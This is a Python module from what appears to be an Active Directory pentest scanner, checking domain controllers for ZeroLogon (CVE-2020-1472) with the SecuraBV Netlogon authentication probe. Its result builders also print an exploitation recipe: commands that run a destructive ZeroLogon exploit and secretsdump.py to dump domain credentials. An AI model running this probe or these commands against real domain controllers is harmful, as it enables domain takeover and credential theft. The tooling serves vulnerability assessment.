"""
CVE-2020-1472 — ZeroLogon

Brief §2.2: replaced the old heuristic ``NetrServerReqChallenge``
ErrorCode==0 probe (which patched DCs *also* return 0 for) with the
SecuraBV ``NetrServerAuthenticate3`` algorithm — the same one
``zerologon_tester.py`` uses and the same one Microsoft used to
characterise the vulnerability.

Algorithm:

  1. EPM-resolve the netlogon endpoint on the DC (ncacn_ip_tcp).
  2. For each of up to ``MAX_ATTEMPTS`` (=2000):
     a. Fresh DCERPC connection + bind(MSRPC_UUID_NRPC). The netlogon
        channel becomes unusable after a failed attempt, so a new
        connection per try is required (matches SecuraBV's recipe).
     b. ``NetrServerAuthenticate3`` with:
          PrimaryName       = "\\\\<DC>"
          AccountName       = "<DC>$"
          SecureChannelType = ServerSecureChannel
          ComputerName      = "<DC>"
          ClientCredential  = b"\\x00" * 8
          NegotiateFlags    = 0x212fffff
     c. ``ErrorCode == 0`` → vulnerable. Return immediately.
     d. ``STATUS_ACCESS_DENIED`` (0xc0000022) → either patched OR a
        statistical miss (unpatched DCs accept ~1 in 256 attempts).
        Try again.
     e. Any other RPC error → probe failed, return None (don't lie).
  3. After 2000 consecutive ACCESS_DENIED responses, the DC is
     statistically certain to be patched. Return False.

Non-destructive: ``NetrServerAuthenticate3`` only negotiates the
secure channel session key. It does **not** call
``NetrServerPasswordSet2``, which is the call that actually changes
the DC machine account password and breaks the domain.

A patched-DC scan is slow (~100s for 2000 fresh RPC connections); a
vulnerable-DC scan returns within seconds (statistically the first
hit lands in the first ~256 attempts).
"""

from .cve_base import (
    PATCH_STATUS_INDETERMINATE,
    PATCH_STATUS_RPC_CONFIRMED_PATCHED,
    PATCH_STATUS_RPC_CONFIRMED_VULNERABLE,
    CVEBase,
    CVEResult,
    Severity,
)

try:
    from impacket.dcerpc.v5 import epm, nrpc, transport
    from impacket.dcerpc.v5.dtypes import NULL
    from impacket.dcerpc.v5.rpcrt import DCERPCException
    IMPACKET_AVAILABLE = True
except ImportError:
    IMPACKET_AVAILABLE = False


# Number of NetrServerAuthenticate3 attempts before declaring the DC
# patched. SecuraBV uses 2000; their analysis shows that on a vulnerable
# DC the first success lands in the first ~256 attempts with
# overwhelming probability (~1 in 256 statistical accept rate). 2000
# gives ~99.999% confidence in a patched verdict.
MAX_ATTEMPTS = 2000


class ZeroLogon(CVEBase):
    CVE_ID = "CVE-2020-1472"
    NAME   = "ZeroLogon"

    def check(self) -> CVEResult:
        rpc_indicator = self._probe_securabv() if IMPACKET_AVAILABLE else None

        if rpc_indicator is None:
            return self._indeterminate_result()
        if rpc_indicator is True:
            return self._vulnerable_result()
        return self._patched_result()

    # ------------------------------------------------------------------ #
    #  Result builders                                                    #
    # ------------------------------------------------------------------ #

    def _indeterminate_result(self) -> CVEResult:
        return CVEResult(
            cve_id      = self.CVE_ID,
            name        = self.NAME,
            severity    = Severity.HIGH,
            vulnerable  = True,   # CVE applies until proven otherwise
            reason      = (
                "RPC probe could not be run "
                "(impacket missing, EPM lookup failed, or the DC is unreachable "
                "on the dynamic netlogon endpoint). Verify externally with "
                "zerologon_tester.py before exploitation."
            ),
            evidence     = {"rpc_probe": None, "impacket_available": IMPACKET_AVAILABLE},
            remediation  = self._remediation(),
            next_step    = self._exploitation_recipe(),
            noise_level  = "LOW",
            patch_status = PATCH_STATUS_INDETERMINATE,
        )

    def _vulnerable_result(self) -> CVEResult:
        return CVEResult(
            cve_id      = self.CVE_ID,
            name        = self.NAME,
            severity    = Severity.CRITICAL,
            vulnerable  = True,
            reason      = (
                "Netlogon accepted a NetrServerAuthenticate3 with zeroed "
                "ClientCredential and NegotiateFlags=0x212fffff — the "
                "DC's machine account password can be reset via "
                "NetrServerPasswordSet2 (CVE-2020-1472)."
            ),
            evidence     = {"rpc_probe": True, "impacket_available": True},
            remediation  = self._remediation(),
            next_step    = self._exploitation_recipe(),
            noise_level  = "MEDIUM",
            patch_status = PATCH_STATUS_RPC_CONFIRMED_VULNERABLE,
        )

    def _patched_result(self) -> CVEResult:
        return CVEResult(
            cve_id      = self.CVE_ID,
            name        = self.NAME,
            severity    = Severity.INFO,
            vulnerable  = False,
            reason      = (
                f"Netlogon rejected all {MAX_ATTEMPTS} NetrServerAuthenticate3 "
                f"attempts with zeroed ClientCredential — DC is patched."
            ),
            evidence     = {"rpc_probe": False, "impacket_available": True},
            remediation  = (
                "Already patched. Verify FullSecureChannelProtection=1 GPO is "
                "deployed for defence-in-depth."
            ),
            next_step    = "",
            noise_level  = "MEDIUM",
            patch_status = PATCH_STATUS_RPC_CONFIRMED_PATCHED,
        )

    def _remediation(self) -> str:
        return (
            "Apply KB4557222 and subsequent Netlogon patches. "
            "Enforce FullSecureChannelProtection=1 via Group Policy."
        )

    def _exploitation_recipe(self) -> str:
        return (
            "# Verify (non-destructive) — same algorithm we just ran:\n"
            f"python3 zerologon_tester.py <DC_NAME> {self.dc_ip}\n\n"
            "# Exploit (DESTRUCTIVE — lab only, restore krbtgt before leaving):\n"
            f"python3 cve-2020-1472-exploit.py <DC_NAME> {self.dc_ip}\n"
            f"secretsdump.py -no-pass -just-dc {self.domain}/<DC_NAME>$@{self.dc_ip}\n"
            "# Then restore the DC machine account password:\n"
            "# https://github.com/risksense/zerologon (restorepassword.py)"
        )

    # ------------------------------------------------------------------ #
    #  SecuraBV probe                                                     #
    # ------------------------------------------------------------------ #

    def _probe_securabv(self) -> bool | None:
        """Run the SecuraBV ground-truth ZeroLogon test.

        Returns True (vulnerable), False (patched), or None (probe
        failed — don't claim either way). Non-destructive: only calls
        NetrServerAuthenticate3, never NetrServerPasswordSet2.
        """
        target_dc = self._resolve_dc_name()
        if not target_dc:
            return None

        try:
            netlogon_binding = epm.hept_map(
                self.dc_ip, nrpc.MSRPC_UUID_NRPC, protocol="ncacn_ip_tcp"
            )
        except Exception:
            return None

        for attempt in range(MAX_ATTEMPTS):
            outcome = self._single_attempt(netlogon_binding, target_dc)
            if outcome is True:
                return True
            if outcome is None:
                # Don't know what happened — abort. Better to return
                # INDETERMINATE than to falsely claim either way.
                return None
            # outcome is False — STATUS_ACCESS_DENIED, try again.
            del attempt   # silence ruff
        return False  # MAX_ATTEMPTS denials → patched

    def _single_attempt(self, binding: str, target_dc: str) -> bool | None:
        """One iteration of the probe.

        True  — auth succeeded (DC is vulnerable, exit immediately)
        False — STATUS_ACCESS_DENIED (try again)
        None  — unexpected error (abort the whole probe)
        """
        rpc = None
        try:
            rpc = transport.DCERPCTransportFactory(binding).get_dce_rpc()
            rpc.set_connect_timeout(5)
            rpc.connect()
            rpc.bind(nrpc.MSRPC_UUID_NRPC)

            request = nrpc.NetrServerAuthenticate3()
            request["PrimaryName"]       = NULL
            request["AccountName"]       = f"{target_dc}$\x00"
            request["SecureChannelType"] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
            request["ComputerName"]      = f"{target_dc}\x00"
            request["ClientCredential"]  = b"\x00" * 8
            request["NegotiateFlags"]    = 0x212fffff

            try:
                rpc.request(request)
                # No exception → ErrorCode 0 → vulnerable.
                return True
            except DCERPCException as e:
                if hasattr(e, "get_error_code") and e.get_error_code() == 0xc0000022:
                    return False  # ACCESS_DENIED, retry
                return None
        except Exception:
            return None
        finally:
            if rpc is not None:
                try:
                    rpc.disconnect()
                except Exception:
                    pass

    # ------------------------------------------------------------------ #
    #  DC name resolution                                                 #
    # ------------------------------------------------------------------ #

    def _resolve_dc_name(self) -> str | None:
        """Find the DC's machine account name (without trailing ``$``)
        via LDAP. Prefers the DC matching ``self.dc_ip``, falls back to
        the first DC enumerated."""
        try:
            entries = self.ldap.query(
                "(&(objectClass=computer)(primaryGroupID=516))",
                ["sAMAccountName", "dNSHostName"],
            )
        except Exception:
            return None
        if not entries:
            return None

        for e in entries:
            try:
                dns = str(e["dNSHostName"].value or "")
            except Exception:
                dns = ""
            if dns and self.dc_ip in dns:
                sam = str(e["sAMAccountName"].value or "")
                return sam.rstrip("$") or None

        try:
            sam = str(entries[0]["sAMAccountName"].value or "")
            return sam.rstrip("$") or None
        except Exception:
            return None
